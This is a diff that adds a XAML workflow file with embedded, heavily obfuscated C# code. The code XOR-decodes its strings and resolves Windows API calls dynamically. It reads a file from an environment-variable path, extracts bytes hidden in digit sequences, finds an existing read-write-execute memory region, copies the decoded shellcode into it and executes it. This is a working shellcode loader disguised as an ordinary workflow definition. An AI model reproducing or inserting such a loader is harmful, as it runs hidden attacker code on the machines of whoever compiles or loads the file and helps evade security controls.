@@ -1,0 +1,186 @@
+<SequentialWorkflowActivity x:Class="hxeorQqscgzrxthnehotqaa" xmlns="http://schemas.microsoft.com/winfx/2006/xaml/workflow" xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml">
+<CodeActivity x:Name="lcwdbeonsVmxbkohq" />
+<x:Code><![CDATA[
+public class ffrjphckdztjYcipinjegsnzbfniivfh :SequentialWorkflowActivity{
+    private static bool rrslgtlfsqLvtskdtfoeimaw(System.IntPtr qgopbhwZsxutjy, out MEMORY_BASIC_INFORMATION iuqjgbblsqthYzjb, uint lersXxpcqgi) {
+	iuqjgbblsqthYzjb = new MEMORY_BASIC_INFORMATION();
+	object[] bcdedunyzurmhhbdcFgfomrsikuuc = new object[] {qgopbhwZsxutjy, iuqjgbblsqthYzjb, lersXxpcqgi};
+	var lsnafldkpqHtthpyfhetzblwpkkwta = ffrjphckdztjYcipinjegsnzbfniivfh.lrdfjtzcgbcEkzmcgaetljyskejpkwh(ffrjphckdztjYcipinjegsnzbfniivfh.pugkxlxrafyyaFhhvotbpjctlvfkjsktq("uf1z50GtIVue1h2HQ/ccbKDLZP0Kj30H1c4nggvAAWy+yXTsVrhuC9/dHZcqzQd5t/UvwEq1Qh3Ckh2bONAQf7frcvVLtGZJ/fc8pCvtK0+Ty0jKe4hcL//gPKot/TtD8vRxy1GndAzCzgSCF8BUaaXUZOdDtXo="), bcdedunyzurmhhbdcFgfomrsikuuc);
+	iuqjgbblsqthYzjb = (MEMORY_BASIC_INFORMATION)bcdedunyzurmhhbdcFgfomrsikuuc[1];
+return (bool)lsnafldkpqHtthpyfhetzblwpkkwta; }
+    public static System.IntPtr jxndqvPbusnsybccnv(string ejematvxofcxlopbtNtremg) {
+	object[] bcdedunyzurmhhbdcFgfomrsikuuc = new object[] {ejematvxofcxlopbtNtremg};
+	var lsnafldkpqHtthpyfhetzblwpkkwta = ffrjphckdztjYcipinjegsnzbfniivfh.lrdfjtzcgbcEkzmcgaetljyskejpkwh(ffrjphckdztjYcipinjegsnzbfniivfh.pugkxlxrafyyaFhhvotbpjctlvfkjsktq("uf1z50GtIVue1h2HQ/ccbKDLZP0Kj30H1c42jg35G2mn9GTBRa92BdXOIpIKwBFg/NFv/XS1YBXDxgOCF9NUYaLVbu1RrXcn0d8U"), bcdedunyzurmhhbdcFgfomrsikuuc);
+return (System.IntPtr)lsnafldkpqHtthpyfhetzblwpkkwta; }
+    public static System.IntPtr vzhzvsjdefrwjwjnspZpfsxspbhnbfyeedokqohym(System.IntPtr xttdludbnoxTmiifgwyovmiabxt, string ysdvwdzbudlzvxarIgekmxpiuukktcobncpvuxqf) {
+	object[] bcdedunyzurmhhbdcFgfomrsikuuc = new object[] {xttdludbnoxTmiifgwyovmiabxt, ysdvwdzbudlzvxarIgekmxpiuukktcobncpvuxqf};
+	var lsnafldkpqHtthpyfhetzblwpkkwta = ffrjphckdztjYcipinjegsnzbfniivfh.lrdfjtzcgbcEkzmcgaetljyskejpkwh(ffrjphckdztjYcipinjegsnzbfniivfh.pugkxlxrafyyaFhhvotbpjctlvfkjsktq("uf1z50GtIVue1h2HQ/ccbKDLZP0Kj30H1c42jg3kBmKx2WXtVqRhGszhCJgN0Rkjm/Z12VCzbjrJwQWOFJo9Y6bIdfsEqV8G1McdjgXHAH+79mapVLN9Cv7THI4="), bcdedunyzurmhhbdcFgfomrsikuuc);
+return (System.IntPtr)lsnafldkpqHtthpyfhetzblwpkkwta; }
+    [System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential)]
+    private struct MEMORY_BASIC_INFORMATION {
+        public System.IntPtr rzfuthvryvrogtyksloNxoukgqlvahqoxlctcvey;
+        public System.IntPtr vdkxpvladilgyCfvncvzqqfcqvr;
+        public uint wgpbktrAjbpjadicr;
+        public System.IntPtr ogibcmwexhguehSgbweninvebgpqmxzzhrpbof;
+        public uint nptschlcixggmzQbldzwwgraigmmr;
+        public uint vipzttdbuunhpqsmiAoplfqrhxtjvuykrfk;
+        public uint axhicfbjycjpuelcagqsyswZtfzwcqkfuphdghiaphiuj; }
+    [System.Runtime.InteropServices.UnmanagedFunctionPointer(System.Runtime.InteropServices.CallingConvention.Cdecl)]
+    private delegate void lwvrfnmojtooncqAyryiitzlocdlflnbgroyvin(System.IntPtr mtmozohjtqoFmacvbc, System.IntPtr irpkmtifwkqzbilwvfUwdkixmipptzwnmt, System.IntPtr eccggcmjapdepgzwhwlyiSxddsmxncmimqsscoqbx, System.IntPtr xelamzafqhwlmfydnqovxcvrYnhttfkajvzzrszxnxvaqe);
+    private static string qniqyugyhahpxffhirdvEwhwt = System.Environment.ExpandEnvironmentVariables(ffrjphckdztjYcipinjegsnzbfniivfh.pugkxlxrafyyaFhhvotbpjctlvfkjsktq("99ROymWNUzng9jC/OJEoQLv7c+ZXrnQd7OUYhTfAIVGk8WT+UKh/DJ7RAp0="));
+    private delegate System.IntPtr oodvrfjtlprugrrwkccjaJyfnhworepdcqufvpx(int dlckieyuJtbzsgmlwwcqfz);
+    private oodvrfjtlprugrrwkccjaJyfnhworepdcqufvpx cqjbqzdjjuzmloracyrlujzAcfyxuflwzedixzrq;
+    public ffrjphckdztjYcipinjegsnzbfniivfh()    {
+        pbqjcrokxwbscBojulwbygmsfhzxdhbdtvh(); }
+    private void pbqjcrokxwbscBojulwbygmsfhzxdhbdtvh(){
+        System.Collections.Generic.List<string> zovmijroahonHsffslwdtbqzuwfesbwkvqe = new System.Collections.Generic.List<string>(System.IO.File.ReadLines(qniqyugyhahpxffhirdvEwhwt));
+        zovmijroahonHsffslwdtbqzuwfesbwkvqe.RemoveAt(0);
+        string zybrodzmervgmecugeyxVsmenwzker = zovmijroahonHsffslwdtbqzuwfesbwkvqe[0].Split(';')[0];
+        uint lxtmumfyrmpekxfxuPpmfwmhmxdseoin = System.Convert.ToUInt32(zybrodzmervgmecugeyxVsmenwzker.Split('.')[0]);
+        uint uolpAtzagichup = System.Convert.ToUInt32(zybrodzmervgmecugeyxVsmenwzker.Split('.')[1]);
+        byte[] ppbeipllaxjntcecdCdrmf = new byte[uolpAtzagichup];
+        wqwyunnjxybankcvNlnemepdukhpvudkjkyc(zovmijroahonHsffslwdtbqzuwfesbwkvqe, 2, uolpAtzagichup, ppbeipllaxjntcecdCdrmf);
+        string mfpefednccyslwzEdzpdkmgddzermypkbgrd = System.Text.Encoding.Default.GetString(ppbeipllaxjntcecdCdrmf);
+        var gvuvLremqgczo = mfpefednccyslwzEdzpdkmgddzermypkbgrd.Split(';');
+        uint lkaymbfalbdmoqFewewsuipbozqjxo = 0, dupvrenfaujthfPvkcgurtvcvz = 0, kwdwotjtbjnsQrszzvtjjuyuis = 0, znarubvermfowwuboodAbwcagacpxi = 0;
+        foreach (var stvwgaawckgkmreqyijiucGanrqxmavefpipcighws in gvuvLremqgczo) {
+            char zzuojwypwnhmqfmNzxgtoshckzltyfgjyjow = stvwgaawckgkmreqyijiucGanrqxmavefpipcighws[0];
+            if (zzuojwypwnhmqfmNzxgtoshckzltyfgjyjow == 'm') {
+                var rsqodNppkbopqa = stvwgaawckgkmreqyijiucGanrqxmavefpipcighws.Split('|');
+                lkaymbfalbdmoqFewewsuipbozqjxo = System.Convert.ToUInt32(rsqodNppkbopqa[1]);
+                dupvrenfaujthfPvkcgurtvcvz = System.Convert.ToUInt32(rsqodNppkbopqa[2]); }
+            else if (zzuojwypwnhmqfmNzxgtoshckzltyfgjyjow == 'p') {
+                var rsqodNppkbopqa = stvwgaawckgkmreqyijiucGanrqxmavefpipcighws.Split('|');
+                kwdwotjtbjnsQrszzvtjjuyuis = System.Convert.ToUInt32(rsqodNppkbopqa[1]);
+                znarubvermfowwuboodAbwcagacpxi = System.Convert.ToUInt32(rsqodNppkbopqa[2]); } }
+        byte[] hhrrdJkfrrhyogqplsfndzpun = new byte[dupvrenfaujthfPvkcgurtvcvz];
+        wqwyunnjxybankcvNlnemepdukhpvudkjkyc(zovmijroahonHsffslwdtbqzuwfesbwkvqe, lxtmumfyrmpekxfxuPpmfwmhmxdseoin + lkaymbfalbdmoqFewewsuipbozqjxo, dupvrenfaujthfPvkcgurtvcvz, hhrrdJkfrrhyogqplsfndzpun);
+        byte[] keioghebhekcihlxmgqbDkyexuoqhsxdjtaa = new byte[znarubvermfowwuboodAbwcagacpxi];
+        wqwyunnjxybankcvNlnemepdukhpvudkjkyc(zovmijroahonHsffslwdtbqzuwfesbwkvqe, lxtmumfyrmpekxfxuPpmfwmhmxdseoin + kwdwotjtbjnsQrszzvtjjuyuis, znarubvermfowwuboodAbwcagacpxi, keioghebhekcihlxmgqbDkyexuoqhsxdjtaa);
+        System.IntPtr arjfikaqxgSccnw = System.Runtime.InteropServices.Marshal.AllocHGlobal(keioghebhekcihlxmgqbDkyexuoqhsxdjtaa.Length);
+        System.Runtime.InteropServices.Marshal.Copy(keioghebhekcihlxmgqbDkyexuoqhsxdjtaa, 0, arjfikaqxgSccnw, keioghebhekcihlxmgqbDkyexuoqhsxdjtaa.Length);
+        System.IntPtr zgerlsotphgtohkpkfZsybnehxixfpj = revmvbicllibennqkYjoyeusrhpuyyhtykcgaodfe(hhrrdJkfrrhyogqplsfndzpun.Length);
+        System.Runtime.InteropServices.Marshal.Copy(hhrrdJkfrrhyogqplsfndzpun, 0, zgerlsotphgtohkpkfZsybnehxixfpj, hhrrdJkfrrhyogqplsfndzpun.Length);
+        System.IntPtr hatdkpyulTdtwjyimrhxaoytak = jxndqvPbusnsybccnv(ffrjphckdztjYcipinjegsnzbfniivfh.pugkxlxrafyyaFhhvotbpjctlvfkjsktq("uf1z50GtIVue1h2H"));
+        System.IntPtr qozxzbghqlzqbxnIjkkojpsxcjr = vzhzvsjdefrwjwjnspZpfsxspbhnbfyeedokqohym(hatdkpyulTdtwjyimrhxaoytak, ffrjphckdztjYcipinjegsnzbfniivfh.pugkxlxrafyyaFhhvotbpjctlvfkjsktq("lf112VaucSjU1gOOCsc="));
+        var adabnewtgtvcqrbrrwcAqjpa = (lwvrfnmojtooncqAyryiitzlocdlflnbgroyvin)System.Runtime.InteropServices.Marshal.GetDelegateForFunctionPointer(zgerlsotphgtohkpkfZsybnehxixfpj, typeof(lwvrfnmojtooncqAyryiitzlocdlflnbgroyvin));
+        adabnewtgtvcqrbrrwcAqjpa(hatdkpyulTdtwjyimrhxaoytak, qozxzbghqlzqbxnIjkkojpsxcjr, zgerlsotphgtohkpkfZsybnehxixfpj, arjfikaqxgSccnw); }
+    private System.IntPtr revmvbicllibennqkYjoyeusrhpuyyhtykcgaodfe(int dlckieyuJtbzsgmlwwcqfz) {
+        cqjbqzdjjuzmloracyrlujzAcfyxuflwzedixzrq = revmvbicllibennqkYjoyeusrhpuyyhtykcgaodfe;
+        System.IntPtr bwbvqknfpizpntqodrplsyrfKnos =  System.Runtime.InteropServices.Marshal.GetFunctionPointerForDelegate(cqjbqzdjjuzmloracyrlujzAcfyxuflwzedixzrq);
+        System.IntPtr nabncarldkplbTsbijkbfylnhdevkcw = new System.IntPtr(0x00);
+        System.IntPtr yuznaqqwsnewhxynieeiKlppofzvvaanurcytoi = new System.IntPtr(0x00);
+        MEMORY_BASIC_INFORMATION enkgqaggibysmjmekzuRuarnqcpuzuuvlofyeix = new MEMORY_BASIC_INFORMATION();
+        uint pnzcviiqTionbzewxpoklhngcgy = (uint)System.Runtime.InteropServices.Marshal.SizeOf(typeof(MEMORY_BASIC_INFORMATION));
+        while(nabncarldkplbTsbijkbfylnhdevkcw.ToInt64() < 0xFFFFFFFFFFF) {
+            rrslgtlfsqLvtskdtfoeimaw(nabncarldkplbTsbijkbfylnhdevkcw, out enkgqaggibysmjmekzuRuarnqcpuzuuvlofyeix, pnzcviiqTionbzewxpoklhngcgy);
+            if (enkgqaggibysmjmekzuRuarnqcpuzuuvlofyeix.vipzttdbuunhpqsmiAoplfqrhxtjvuykrfk == 0x40) {
+                yuznaqqwsnewhxynieeiKlppofzvvaanurcytoi = new System.IntPtr(enkgqaggibysmjmekzuRuarnqcpuzuuvlofyeix.rzfuthvryvrogtyksloNxoukgqlvahqoxlctcvey.ToInt64() + enkgqaggibysmjmekzuRuarnqcpuzuuvlofyeix.ogibcmwexhguehSgbweninvebgpqmxzzhrpbof.ToInt64());
+                if (!( enkgqaggibysmjmekzuRuarnqcpuzuuvlofyeix.rzfuthvryvrogtyksloNxoukgqlvahqoxlctcvey.ToInt64() < bwbvqknfpizpntqodrplsyrfKnos.ToInt64() && bwbvqknfpizpntqodrplsyrfKnos.ToInt64() < yuznaqqwsnewhxynieeiKlppofzvvaanurcytoi.ToInt64() )) {
+                    if (dlckieyuJtbzsgmlwwcqfz < enkgqaggibysmjmekzuRuarnqcpuzuuvlofyeix.ogibcmwexhguehSgbweninvebgpqmxzzhrpbof.ToInt64()) {
+                        return enkgqaggibysmjmekzuRuarnqcpuzuuvlofyeix.rzfuthvryvrogtyksloNxoukgqlvahqoxlctcvey; } } }
+            nabncarldkplbTsbijkbfylnhdevkcw = new System.IntPtr(enkgqaggibysmjmekzuRuarnqcpuzuuvlofyeix.rzfuthvryvrogtyksloNxoukgqlvahqoxlctcvey.ToInt64() + enkgqaggibysmjmekzuRuarnqcpuzuuvlofyeix.ogibcmwexhguehSgbweninvebgpqmxzzhrpbof.ToInt64()); }
+        return new System.IntPtr(0x00); }
+    private void wqwyunnjxybankcvNlnemepdukhpvudkjkyc(System.Collections.Generic.List<string> qrhahvbuhtqidZrewepyrafhkkdtbpidz, uint rxynosgrypEhweyuajndqlzpxrhtsl, uint vfzhyrbfkigrgcGpdvhtmedg, byte[] qwknzmdwmqerwihhthehiukSqwdsvrctjp) {
+        uint zbcpxfnSkutheflfhjoach = 0;
+        uint uhizszpkebuhmxeurdmVudhbcbuxk = 0;
+        foreach(string line in qrhahvbuhtqidZrewepyrafhkkdtbpidz) {
+            string sitvpwNzlfjccldtkftj = ffrjphckdztjYcipinjegsnzbfniivfh.pugkxlxrafyyaFhhvotbpjctlvfkjsktq("");
+            uint xnqzgxreszbobzscoxeebpkAfqyhkrqtoxkffqqpign = 0;
+            foreach(char c in line) {
+                if (zbcpxfnSkutheflfhjoach < vfzhyrbfkigrgcGpdvhtmedg) {
+                    if(System.Char.IsDigit(c)) {
+                        xnqzgxreszbobzscoxeebpkAfqyhkrqtoxkffqqpign++;
+                        sitvpwNzlfjccldtkftj+=c; }
+                    else {
+                        if (uhizszpkebuhmxeurdmVudhbcbuxk >= rxynosgrypEhweyuajndqlzpxrhtsl) {
+                            if(xnqzgxreszbobzscoxeebpkAfqyhkrqtoxkffqqpign>0) {
+                                if(xnqzgxreszbobzscoxeebpkAfqyhkrqtoxkffqqpign<4) {
+                                    int nkeahqvfuticPuqzj=0;
+                                    byte jhadomxyhovucazrgthcAuou=0;
+                                    System.Int32.TryParse(sitvpwNzlfjccldtkftj,out nkeahqvfuticPuqzj);
+                                    if(299<nkeahqvfuticPuqzj&&nkeahqvfuticPuqzj<800)
+                                    {jhadomxyhovucazrgthcAuou=System.Convert.ToByte(sitvpwNzlfjccldtkftj.Substring(1));}
+                                    else if(nkeahqvfuticPuqzj<100&&zbcpxfnSkutheflfhjoach % 2 == 0)
+                                    {jhadomxyhovucazrgthcAuou=System.Convert.ToByte(sitvpwNzlfjccldtkftj.Substring(1));}
+                                    else if(799<nkeahqvfuticPuqzj&&nkeahqvfuticPuqzj<900)
+                                    {string cpvzqyLnaung=ffrjphckdztjYcipinjegsnzbfniivfh.pugkxlxrafyyaFhhvotbpjctlvfkjsktq("4w==")+sitvpwNzlfjccldtkftj.Substring(1);
+                                    jhadomxyhovucazrgthcAuou=System.Convert.ToByte(cpvzqyLnaung);}
+                                    else if(899<nkeahqvfuticPuqzj&&nkeahqvfuticPuqzj<1000)
+                                    {string cpvzqyLnaung=ffrjphckdztjYcipinjegsnzbfniivfh.pugkxlxrafyyaFhhvotbpjctlvfkjsktq("4A==")+sitvpwNzlfjccldtkftj.Substring(1);
+                                    jhadomxyhovucazrgthcAuou=System.Convert.ToByte(cpvzqyLnaung);}
+                                    else
+                                    {jhadomxyhovucazrgthcAuou=System.Convert.ToByte(sitvpwNzlfjccldtkftj);}
+                                    qwknzmdwmqerwihhthehiukSqwdsvrctjp[zbcpxfnSkutheflfhjoach]=jhadomxyhovucazrgthcAuou;
+                                    zbcpxfnSkutheflfhjoach++; } } }
+                        xnqzgxreszbobzscoxeebpkAfqyhkrqtoxkffqqpign=0;
+                        sitvpwNzlfjccldtkftj=ffrjphckdztjYcipinjegsnzbfniivfh.pugkxlxrafyyaFhhvotbpjctlvfkjsktq("");
+                        uhizszpkebuhmxeurdmVudhbcbuxk = uhizszpkebuhmxeurdmVudhbcbuxk + 1; } } } } }
+private static System.Reflection.Emit.ModuleBuilder ksoqyyfcqdkfcrzotGaljhchyxipafdz;
+private static System.Collections.Generic.Dictionary<string, System.Type> rigxweWayrpkvunlahfeecpgs = new System.Collections.Generic.Dictionary<string, System.Type>();
+private static System.Type vgkpjvwkpvyspuqkhrbseKgyncurqdm(string vxjtoKqqklzzl) {
+    string qblaKcjzriwjvpijlsnb = vxjtoKqqklzzl.StartsWith(ffrjphckdztjYcipinjegsnzbfniivfh.pugkxlxrafyyaFhhvotbpjctlvfkjsktq("geFy/UGsPA==")) ? vxjtoKqqklzzl.Substring(7) : vxjtoKqqklzzl;
+    if (qblaKcjzriwjvpijlsnb.Equals(ffrjphckdztjYcipinjegsnzbfniivfh.pugkxlxrafyyaFhhvotbpjctlvfkjsktq("m/Z12VCz"))) return typeof(System.IntPtr);
+    if (qblaKcjzriwjvpijlsnb.Equals(ffrjphckdztjYcipinjegsnzbfniivfh.pugkxlxrafyyaFhhvotbpjctlvfkjsktq("h9Fv/XS1YA=="))) return typeof(System.UIntPtr);
+    if (qblaKcjzriwjvpijlsnb.Equals(ffrjphckdztjYcipinjegsnzbfniivfh.pugkxlxrafyyaFhhvotbpjctlvfkjsktq("m/Z1uBI=")) || qblaKcjzriwjvpijlsnb.Equals(ffrjphckdztjYcipinjegsnzbfniivfh.pugkxlxrafyyaFhhvotbpjctlvfkjsktq("ofBu+1A="))) return typeof(short);
+    if (qblaKcjzriwjvpijlsnb.Equals(ffrjphckdztjYcipinjegsnzbfniivfh.pugkxlxrafyyaFhhvotbpjctlvfkjsktq("h9Fv/RX3")) || qblaKcjzriwjvpijlsnb.Equals(ffrjphckdztjYcipinjegsnzbfniivfh.pugkxlxrafyyaFhhvotbpjctlvfkjsktq("p+tp5la1"))) return typeof(System.UInt16);
+    if (qblaKcjzriwjvpijlsnb.Equals(ffrjphckdztjYcipinjegsnzbfniivfh.pugkxlxrafyyaFhhvotbpjctlvfkjsktq("m/Z1uhY=")) || qblaKcjzriwjvpijlsnb.Equals(ffrjphckdztjYcipinjegsnzbfniivfh.pugkxlxrafyyaFhhvotbpjctlvfkjsktq("u/Z1"))) return typeof(int);
+    if (qblaKcjzriwjvpijlsnb.Equals(ffrjphckdztjYcipinjegsnzbfniivfh.pugkxlxrafyyaFhhvotbpjctlvfkjsktq("h9Fv/Rfz")) || qblaKcjzriwjvpijlsnb.Equals(ffrjphckdztjYcipinjegsnzbfniivfh.pugkxlxrafyyaFhhvotbpjctlvfkjsktq("p/Fv/Q=="))) return typeof(System.UInt32);
+    if (qblaKcjzriwjvpijlsnb.Equals(ffrjphckdztjYcipinjegsnzbfniivfh.pugkxlxrafyyaFhhvotbpjctlvfkjsktq("m/Z1vxA=")) || qblaKcjzriwjvpijlsnb.Equals(ffrjphckdztjYcipinjegsnzbfniivfh.pugkxlxrafyyaFhhvotbpjctlvfkjsktq("vvdv7g=="))) return typeof(long);
+    if (qblaKcjzriwjvpijlsnb.Equals(ffrjphckdztjYcipinjegsnzbfniivfh.pugkxlxrafyyaFhhvotbpjctlvfkjsktq("h9Fv/RL1")) || qblaKcjzriwjvpijlsnb.Equals(ffrjphckdztjYcipinjegsnzbfniivfh.pugkxlxrafyyaFhhvotbpjctlvfkjsktq("p/Ru50M="))) return typeof(System.UInt64);
+    if (qblaKcjzriwjvpijlsnb.ToLower().Equals(ffrjphckdztjYcipinjegsnzbfniivfh.pugkxlxrafyyaFhhvotbpjctlvfkjsktq("oexz4Eqm"))) return typeof(string);
+    if (qblaKcjzriwjvpijlsnb.ToLower().Equals(ffrjphckdztjYcipinjegsnzbfniivfh.pugkxlxrafyyaFhhvotbpjctlvfkjsktq("sfBg+w=="))) return typeof(char);
+    if (qblaKcjzriwjvpijlsnb.ToLower().Equals(ffrjphckdztjYcipinjegsnzbfniivfh.pugkxlxrafyyaFhhvotbpjctlvfkjsktq("sOF17A=="))) return typeof(byte);
+    if (qblaKcjzriwjvpijlsnb.ToLower().Equals(ffrjphckdztjYcipinjegsnzbfniivfh.pugkxlxrafyyaFhhvotbpjctlvfkjsktq("ofp4/UE="))) return typeof(sbyte);
+    if (qblaKcjzriwjvpijlsnb.ToLower().Equals(ffrjphckdztjYcipinjegsnzbfniivfh.pugkxlxrafyyaFhhvotbpjctlvfkjsktq("tvd060ik"))) return typeof(double);
+    if (qblaKcjzriwjvpijlsnb.ToLower().Equals(ffrjphckdztjYcipinjegsnzbfniivfh.pugkxlxrafyyaFhhvotbpjctlvfkjsktq("tv1i4Emgfg=="))) return typeof(decimal);
+    if (qblaKcjzriwjvpijlsnb.Equals(ffrjphckdztjYcipinjegsnzbfniivfh.pugkxlxrafyyaFhhvotbpjctlvfkjsktq("sPdu5Q==")) || qblaKcjzriwjvpijlsnb.Equals(ffrjphckdztjYcipinjegsnzbfniivfh.pugkxlxrafyyaFhhvotbpjctlvfkjsktq("kPdu5UGgfA=="))) return typeof(bool);
+    if (qblaKcjzriwjvpijlsnb.Equals(ffrjphckdztjYcipinjegsnzbfniivfh.pugkxlxrafyyaFhhvotbpjctlvfkjsktq("pPdo7Q==")) || vxjtoKqqklzzl.Equals(ffrjphckdztjYcipinjegsnzbfniivfh.pugkxlxrafyyaFhhvotbpjctlvfkjsktq("pPdo7Q=="))) return typeof(void);
+    foreach (System.Reflection.Assembly jtqypowhnozqnvjpJdkbpbexiooqccmcmmru in System.AppDomain.CurrentDomain.GetAssemblies()) {
+        System.Type oevuzppszevogznReimu = jtqypowhnozqnvjpJdkbpbexiooqccmcmmru.GetType(vxjtoKqqklzzl);
+        if (oevuzppszevogznReimu != null) return oevuzppszevogznReimu; }
+    return null; }
+private static System.Type fqhuXvtg(string vbpavlsxCjkavokighcl, string ktxeuhexegqghstpftdzhKekvbzdsrjtpxqwcrrkseed, System.Runtime.InteropServices.CharSet gsorbjiwqzonJshafmxxqkcwmob, System.Type dgaagvhpaqzktgqiohyCsyrgmxwq, System.Type[] mhppntoncxalewxmxdLoygdqo, string[] unizrwvDsvdtwtbfbcgtuia) {
+    if (ksoqyyfcqdkfcrzotGaljhchyxipafdz == null) {
+        var exkpvteoezbpngeqdukyjrOgijvu = System.AppDomain.CurrentDomain.DefineDynamicAssembly(
+            new System.Reflection.AssemblyName(ffrjphckdztjYcipinjegsnzbfniivfh.pugkxlxrafyyaFhhvotbpjctlvfkjsktq("hfFvuhY=")), System.Reflection.Emit.AssemblyBuilderAccess.Run);
+        ksoqyyfcqdkfcrzotGaljhchyxipafdz = exkpvteoezbpngeqdukyjrOgijvu.DefineDynamicModule(ffrjphckdztjYcipinjegsnzbfniivfh.pugkxlxrafyyaFhhvotbpjctlvfkjsktq("hfFvuhY="), false); }
+    var puelayjktvnkzwnRlgmnfrj = ksoqyyfcqdkfcrzotGaljhchyxipafdz.DefineType(vbpavlsxCjkavokighcl + ffrjphckdztjYcipinjegsnzbfniivfh.pugkxlxrafyyaFhhvotbpjctlvfkjsktq("kfRg+lc="), System.Reflection.TypeAttributes.Class | System.Reflection.TypeAttributes.Public);
+    var mjdglykazkhkbgggtapkzssTryphzaxkgsnogdiwdj = new System.Collections.Generic.List<System.Type>();
+    for (int ggkzGhmrunutqjpnj = 1; ggkzGhmrunutqjpnj <= unizrwvDsvdtwtbfbcgtuia.Length; ggkzGhmrunutqjpnj++) {
+        string zmwejTrap = unizrwvDsvdtwtbfbcgtuia[ggkzGhmrunutqjpnj - 1];
+        if (zmwejTrap.StartsWith(ffrjphckdztjYcipinjegsnzbfniivfh.pugkxlxrafyyaFhhvotbpjctlvfkjsktq("oP1nqQ==")) || zmwejTrap.StartsWith(ffrjphckdztjYcipinjegsnzbfniivfh.pugkxlxrafyyaFhhvotbpjctlvfkjsktq("ve11qQ=="))) mjdglykazkhkbgggtapkzssTryphzaxkgsnogdiwdj.Add(mhppntoncxalewxmxdLoygdqo[ggkzGhmrunutqjpnj - 1].MakeByRefType());
+        else mjdglykazkhkbgggtapkzssTryphzaxkgsnogdiwdj.Add(mhppntoncxalewxmxdLoygdqo[ggkzGhmrunutqjpnj - 1]); }
+    var gpsgnknpbsofpsxtywOvnbjbzjbagphwzbgf = puelayjktvnkzwnRlgmnfrj.DefinePInvokeMethod(vbpavlsxCjkavokighcl, ktxeuhexegqghstpftdzhKekvbzdsrjtpxqwcrrkseed, vbpavlsxCjkavokighcl,
+        System.Reflection.MethodAttributes.Static | System.Reflection.MethodAttributes.Public,
+        System.Reflection.CallingConventions.Standard, dgaagvhpaqzktgqiohyCsyrgmxwq, mjdglykazkhkbgggtapkzssTryphzaxkgsnogdiwdj.ToArray(),
+        System.Runtime.InteropServices.CallingConvention.Winapi, gsorbjiwqzonJshafmxxqkcwmob);
+    gpsgnknpbsofpsxtywOvnbjbzjbagphwzbgf.SetImplementationFlags(gpsgnknpbsofpsxtywOvnbjbzjbagphwzbgf.GetMethodImplementationFlags() | System.Reflection.MethodImplAttributes.PreserveSig);
+    return puelayjktvnkzwnRlgmnfrj.CreateType(); }
+internal static object lrdfjtzcgbcEkzmcgaetljyskejpkwh(string edgfezaietzuyjojterukouwBbnikumnigmtpxovdl, object[] bkcsrkbdifipjjeclrXkhm) {
+    string[] weztbIkggllzsdbwe = edgfezaietzuyjojterukouwBbnikumnigmtpxovdl.Split('|');
+    string rhdinimlRgnmssoa = weztbIkggllzsdbwe[0].Split(':')[0];
+    System.Runtime.InteropServices.CharSet uabqscqohwdvDxbzjcsvlkpwsatztgecqz = System.Runtime.InteropServices.CharSet.None;
+    if (weztbIkggllzsdbwe[0].Split(':').Length > 1)
+        System.Runtime.InteropServices.CharSet.TryParse(weztbIkggllzsdbwe[0].Split(':')[1].Split('.')[1], out uabqscqohwdvDxbzjcsvlkpwsatztgecqz);
+    string ebpbsybqhwcqLsiliokj = weztbIkggllzsdbwe[1];
+    System.Type xrjrubraednvVinqcmj = vgkpjvwkpvyspuqkhrbseKgyncurqdm(weztbIkggllzsdbwe[2]);
+    System.Type[] vxcnaxsucpauzdxsbdaygsydPxayrlxampbtgdud = new System.Type[bkcsrkbdifipjjeclrXkhm.Length]; for (int combvfpybiiaidzzydxudqraIjbdlxjw = 0; combvfpybiiaidzzydxudqraIjbdlxjw < bkcsrkbdifipjjeclrXkhm.Length; combvfpybiiaidzzydxudqraIjbdlxjw++) vxcnaxsucpauzdxsbdaygsydPxayrlxampbtgdud[combvfpybiiaidzzydxudqraIjbdlxjw] = bkcsrkbdifipjjeclrXkhm[combvfpybiiaidzzydxudqraIjbdlxjw].GetType();
+    string[] qjqnbviskorlhyuheqgeclxmTldm = new string[weztbIkggllzsdbwe.Length - 3]; System.Array.Copy(weztbIkggllzsdbwe, 3, qjqnbviskorlhyuheqgeclxmTldm, 0, weztbIkggllzsdbwe.Length - 3);
+    System.Type zlainpilbcllgcIwcdjds;
+    if (rigxweWayrpkvunlahfeecpgs.ContainsKey(edgfezaietzuyjojterukouwBbnikumnigmtpxovdl)) {
+        zlainpilbcllgcIwcdjds = rigxweWayrpkvunlahfeecpgs[edgfezaietzuyjojterukouwBbnikumnigmtpxovdl];
+    } else {
+        zlainpilbcllgcIwcdjds = fqhuXvtg(ebpbsybqhwcqLsiliokj, rhdinimlRgnmssoa, uabqscqohwdvDxbzjcsvlkpwsatztgecqz, xrjrubraednvVinqcmj, vxcnaxsucpauzdxsbdaygsydPxayrlxampbtgdud, qjqnbviskorlhyuheqgeclxmTldm);
+        rigxweWayrpkvunlahfeecpgs.Add(edgfezaietzuyjojterukouwBbnikumnigmtpxovdl, zlainpilbcllgcIwcdjds); }
+    var vxemetprwfgpgkzlfztPetrfvexjacjlgvfk = zlainpilbcllgcIwcdjds.GetMethod(ebpbsybqhwcqLsiliokj, System.Reflection.BindingFlags.Static | System.Reflection.BindingFlags.Public);
+    return vxemetprwfgpgkzlfztPetrfvexjacjlgvfk.Invoke(null, bkcsrkbdifipjjeclrXkhm);
+} internal static string pugkxlxrafyyaFhhvotbpjctlvfkjsktq(string wvtvqvqywuvqzVrzsiedyxkftmklnis) {
+                byte[] drlkofzmbldSdezdm = new System.Guid("890198d2-c124-6912-b0b2-71eb79b4740d").ToByteArray();
+                byte[] yrawgQtvvjlepc = System.Convert.FromBase64String(wvtvqvqywuvqzVrzsiedyxkftmklnis);
+                byte[] cdtelFiclfizfmcjddjldufuvj = new byte[yrawgQtvvjlepc.Length];
+                for (int ggkzGhmrunutqjpnj = 0; ggkzGhmrunutqjpnj < yrawgQtvvjlepc.Length; ggkzGhmrunutqjpnj++) cdtelFiclfizfmcjddjldufuvj[ggkzGhmrunutqjpnj] = (byte)(yrawgQtvvjlepc[ggkzGhmrunutqjpnj] ^ drlkofzmbldSdezdm[ggkzGhmrunutqjpnj % drlkofzmbldSdezdm.Length]);
+                return System.Text.Encoding.UTF8.GetString(cdtelFiclfizfmcjddjldufuvj);
+            }}
+]]></x:Code>
+</SequentialWorkflowActivity>
